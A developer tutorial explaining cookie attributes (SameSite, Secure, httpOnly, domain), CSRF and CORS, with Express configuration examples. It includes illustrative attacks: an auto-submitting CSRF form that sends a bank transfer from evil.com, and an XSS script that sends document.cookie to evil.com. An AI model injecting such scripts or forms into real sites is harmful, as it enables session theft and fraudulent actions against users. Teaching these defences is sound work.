
## Part 1: The Cookie Configuration You Copy-Paste

You've seen this code everywhere:

```javascript
res.cookie('sessionId', token, {
    httpOnly: true,
    secure: isProduction,
    sameSite: isProduction ? 'none' : 'lax',
    maxAge: 3600000,
    domain: isProduction ? '.yourdomain.com' : undefined
});
```

**But what is each line actually preventing?** Let's reverse engineer it.

# Part 2 — `SameSite`: the first line of defense

`SameSite` controls **when a cookie is sent** by the browser.

> A cookie is the browser token a website uses to identify you.

## `SameSite=Strict`

Cookies are sent **only** for same-site requests.

- Requests from `A.com` → `A.com` include Cookie A.
- Any request from `B.com` → `A.com` **does not** include Cookie A (cross-site requests are blocked).
    

Examples:

```text
A.com / POST ---(Cookie A)---> A.com    // Cookie sent
B.com / GET ---(X Cookie A)---> A.com   // Cookie NOT sent (cross-site)
```

Cross-site actions (requests initiated from another site) will not have the cookie attached when `SameSite=Strict`.

---

## `SameSite=Lax`

`Lax` is more permissive than `Strict`:

- Same-site requests: cookie is sent.
- Some cross-site **safe top-level navigations** (e.g., user clicking a normal link) will include the cookie.
- Cross-site non-GET requests (POST, PUT, etc.) **will not** include the cookie.
    

Examples:

```text
A.com / POST ---(Cookie A)---> A.com    // Cookie sent (same site)

// Cross-site GET via user navigation (link click)
B.com (link to A.com) ---(Cookie A)---> A.com   // Cookie sent

// Cross-site POST form submission
B.com / POST ---(X Cookie A)---> A.com  // Cookie NOT sent
```

> Under `SameSite=Lax`, a site like `B.com` can trigger a **GET** to `A.com` that will include `A.com`’s cookie — this can leak session-related capabilities. We’ll cover additional protections below.

---

## `SameSite=None`

Cookies are sent in **all contexts** (both same-site and cross-site), **but** `Secure` **must** also be set (cookie is sent only over HTTPS).

Examples:

```text
B.com / GET ---(Cookie A)---> A.com   // Cookie sent
B.com / POST ---(Cookie A)---> A.com  // Cookie sent
```

---

### FAQ: What happens when I visit `B.com` — does the browser attach `A.com` cookies to `B.com`?

Nothing special happens. Browsers only attach cookies that belong to the domain being requested. When you visit `B.com`, the browser will only look up and attach cookies for `B.com`. `A.com` cookies are not visible or accessible when browsing `B.com`.

---

# Part 3 — CSRF: What SameSite Protects Against

**CSRF (Cross-Site Request Forgery)** is an attack where a malicious website tricks your browser into making an unwanted request to a site where you're authenticated.

## How CSRF Works

**The Attack Scenario:**

1. You're logged into `bank.com` (your session cookie is stored)
2. You visit `evil.com` (while still logged into `bank.com`)
3. `evil.com` contains a hidden form or image that submits to `bank.com/transfer`:

```html
<!-- On evil.com -->
<form action="https://bank.com/transfer" method="POST" id="evil-form">
  <input name="amount" value="10000">
  <input name="to" value="attacker-account">
</form>
<script>
  document.getElementById('evil-form').submit();  // Auto-submit
</script>
```

4. Your browser automatically includes your `bank.com` session cookie with this request
5. The bank server sees a valid session cookie and processes the transfer — **even though you never intended to make this request!**

## Why Cookies Are Vulnerable to CSRF

- **Cookies are sent automatically** by the browser with every request to the cookie's domain
- **No JavaScript needed** — a simple `<form>`, `<img>`, or `<link>` tag can trigger the request
- **The server can't tell** if the request was intentional or forged — it just sees a valid session cookie

## How SameSite Protects Against CSRF

**With `SameSite='lax'` or `'strict'`:**

```html
<!-- On evil.com, trying to POST to bank.com -->
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="10000">
</form>
```

- The browser sees this is a **cross-site POST request**
- With `SameSite='lax'` or `'strict'`, the browser **does NOT send** the `bank.com` cookie
- The server receives the request **without a session cookie**
- The server rejects the request (user appears unauthenticated) ✅

**Without `SameSite` (or with `SameSite='none'`):**

- The browser **sends** the `bank.com` cookie automatically
- The server sees a valid session and processes the transfer 💥

## SameSite Settings and CSRF Protection

| Setting | CSRF Protection | Use Case |
|---------|----------------|----------|
| `SameSite='strict'` | **Maximum** — blocks ALL cross-site requests | Highest security, but breaks external links |
| `SameSite='lax'` | **Strong** — blocks cross-site POST/PUT/DELETE | Good balance (default in modern browsers) |
| `SameSite='none'` | **None** — cookies sent in all contexts | Requires CSRF tokens or other protection |

> **Note:** `SameSite='lax'` still allows cross-site GET requests (like clicking a link), which is why you need CORS for additional data protection.

---

# Part 4 — The loophole in `Lax` (why we need more)

**Problem:** `SameSite: Lax` allows certain cross-site GET requests to include cookies. That means an attacker can sometimes trigger reads (GETs) that carry your session cookie. To prevent data theft, we need another layer of protection.

---

# Part 5 — CORS: the second layer for GET requests

As noted above, under `SameSite=Lax` a cross-site GET can include cookies. An attacker **can** trigger a GET to your site and the request will reach the server and be processed. But modern browsers implement **CORS** to prevent unauthorized websites from **reading** those responses.

Example attack (under SameSite: lax):

![CORS mechanism diagram showing how browser blocks cross-origin requests](asset/cors-mechanism-diagram.png)

```text
Evil.com ---(Cookie A) /GET balance---> Bank.com
Evil.com ---(Cookie A) /GET messages---> Facebook.com
```

A fetch example:

```javascript
fetch('https://mybank.com/account-balance', {
  method: 'GET',
  credentials: 'include'
});
```

CORS behavior:

- The request reaches the server.
- The server processes it and returns a response.
- **But** the browser blocks the attacking site's JavaScript from **reading** the response unless the server explicitly authorizes that origin.
    

---

## What is `Origin` (Same Origin Policy — SOP)?

```
Origin = scheme + host + port
https://example.com:443
^^^^^   ^^^^^^^^^^^  ^^^
scheme     host      port
```

Each part matters:

- **Scheme** (http vs https) — different schemes are different origins. This prevents insecure pages from accessing secure resources.
- **Host** — different hostnames are different origins (`bank.com` vs `api.bank.com`).
- **Port** — same host + scheme but different port is a different origin (`:443` ≠ `:8080`).
    

SOP is strict by default and blocks cross-origin reads. CORS provides a controlled relaxation: the server can explicitly allow specific origins to read its responses.

---

## CORS: controlled relaxation of SOP

Server-side example (Express + cors):

```js
app.use(cors({
  origin: 'https://mysite.com',  // only this origin can read responses
  credentials: true
}));

// Response header sent:
// Access-Control-Allow-Origin: https://mysite.com
```

---

# Part 6 — `SameSite` vs CORS — the complete picture

They protect different attack surfaces:

|Feature|Purpose|Protects|
|---|---|---|
|**SameSite**|Controls whether cookies are **sent**|Protects **actions** (CSRF)|
|**CORS**|Controls whether JS can **read** responses|Protects **data** (exfiltration)|

### Examples

**Action protection (SameSite)**

```html
<!-- You're on: http://evil.com -->
<form action="https://mybank.com/transfer" method="POST">
  <input name="amount" value="10000">
</form>
```

- Without `SameSite`: cookie is sent → transfer could succeed.
- With `SameSite='lax'` or `Strict`: cookie is not sent → transfer rejected.
    

**Data protection (CORS)**

```javascript
// On evil.com
fetch('https://mybank.com/account-balance', {
  method: 'GET',
  credentials: 'include'
});
```

- `SameSite: Lax` allows the GET and sends the cookie.
- Server responds.
- **CORS** can block JavaScript on `evil.com` from reading the response — protecting sensitive data.
    

---

## Defense in depth: use both

Example secure cookie + CORS configuration:

```js
// Set cookie
res.cookie('sessionId', 'abc123', {
  httpOnly: true,   // protects against XSS reading the cookie
  sameSite: 'lax',  // protects against cross-site POST actions
  secure: true      // only send over HTTPS
});

// CORS: only let trusted origin read responses
app.use(cors({
  origin: 'https://mybank.com',
  credentials: true
}));
```

This combination defends against:

- XSS cookie theft (`httpOnly`)
- CSRF actions (`sameSite`)
- Cross-site data exfiltration (CORS)
    

## Part 7: Why Different Settings for Dev vs Production?

### 🛡️ 1. `secure`

| Environment     | Value           | Explanation                                                                                                                                                                                                                               |
| --------------- | --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Development** | `secure: false` | Local development runs on **HTTP (`localhost`)**, not HTTPS. If set to `true`, the browser refuses to store the cookie and shows an error: _“Cookie marked 'secure' but you're using HTTP.”_  <br>→ No cookies → no session → app breaks. |
| **Production**  | `secure: true`  | Required when serving over **HTTPS**. Ensures cookies are sent only through encrypted connections, protecting users from **session hijacking** (e.g., an attacker on public Wi-Fi capturing cookies sent via HTTP).                       |
### 🌐 2. `sameSite`

| Environment     | Value              | Explanation                                                                                                                                                                                                       |
| --------------- | ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Development** | `sameSite: 'lax'`  | Frontend and backend use **different ports** (e.g., `localhost:3000` → `localhost:8080`), so `'lax'` allows cross-port requests that still work locally. Ideal for dev setups where everything is on `localhost`. |
| **Production**  | `sameSite: 'none'` | Frontend and backend use **different domains** (e.g., `https://myapp.com` → `https://api.myapp.com`). `'none'` enables cross-domain cookies for authenticated API calls. Must be used with `secure: true`.        |
### 🏷️ 3. `domain`

| Environment     | Value                       | Explanation                                                                                                                                                                                                               |
| --------------- | --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Development** | `domain: undefined`         | Defaults to the **current host** (e.g., `localhost:8080`). Works fine for a single local origin, but cookies are not shared between ports or subdomains.                                                                  |
| **Production**  | `domain: '.yourdomain.com'` | Leading dot (`.yourdomain.com`) allows the cookie to be shared across **all subdomains**, such as:  <br>✓ `myapp.com`  <br>✓ `api.myapp.com`  <br>✓ `admin.myapp.com`. Enables consistent login sessions across services. |

---

# Important clarification

**Q: Does `document.cookie` return all browser cookies?**  
**A:** No — only cookies for the **current domain** are returned.

Example:

```javascript
// On https://mybank.com
console.log(document.cookie);
// e.g. "sessionId=abc123; userId=456; theme=dark"
// → Only mybank.com cookies
```

However, if an attacker can run JavaScript on your site (XSS), the attacker can still steal non-`httpOnly` cookies:

```html
You are on the bank.com &&
The hacker manage to embedded a line in JavaScipt.
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
  // This can leak sessionId if sessionId is not httpOnly
  // On Bank.com, You send Your Session ID to evil.com
</script>
```

Setting `httpOnly` on session cookies prevents `document.cookie` from exposing them:

```text
document.cookie  // "theme=dark"  ← sessionId invisible if httpOnly
```